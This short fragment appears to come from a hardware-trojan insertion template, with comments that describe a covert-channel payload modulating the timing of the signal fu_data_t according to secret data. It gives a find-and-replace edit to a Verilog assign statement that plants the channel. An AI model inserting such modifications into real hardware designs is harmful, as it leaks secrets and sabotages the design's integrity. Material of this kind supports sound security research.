 ...
 * Payload: Modulate timing of fu_data_t based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of fu_data_t
//
// Integration Script Must Modify:
//
// IF fu_data_t is timing-sensitive:
//   Find: assign fu_data_t = ready_signal;
//   Replace: assign fu_data_t = (timing_delay == 0) ? ready_signal : 1'b0;
//
